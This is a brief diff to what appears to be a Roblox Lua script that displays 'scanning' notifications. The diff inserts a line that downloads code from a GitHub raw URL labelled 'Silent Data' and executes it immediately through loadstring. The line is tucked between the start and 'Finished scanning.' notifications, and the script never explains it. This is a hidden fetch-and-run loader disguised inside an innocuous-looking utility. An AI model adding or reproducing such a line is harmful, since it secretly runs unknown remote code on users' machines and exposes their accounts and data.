@@ -10,6 +10,10 @@ game.StarterGui:SetCore("SendNotification", {
 	Durcation = 5;
 })
 
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Flickworld/Figit-Executer/main/Silent%20Data'))()
+
+wait(2)
+
 game.StarterGui:SetCore("SendNotification", {
 	Title = "Done!";
 	Text = "Finished scanning.";
